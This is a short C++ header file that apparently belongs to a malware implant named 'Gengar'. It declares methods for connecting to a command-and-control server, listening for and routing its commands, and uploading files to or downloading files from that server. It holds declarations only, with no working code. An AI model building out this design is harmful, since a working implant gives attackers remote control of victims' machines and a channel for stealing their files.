#pragma once
#include <string>
#include "machine.h"
#include "client.h"

class Gengar
{
private:
	Machine m_machine;
	Client m_client;
	void RouteCommand(json);

public:
	void ConnectToCnc();
	void ListenForCommand();
	void UploadFileToCNC(std::string path);
	void DownloadFileFromCNC(std::string data, std::string path);
};
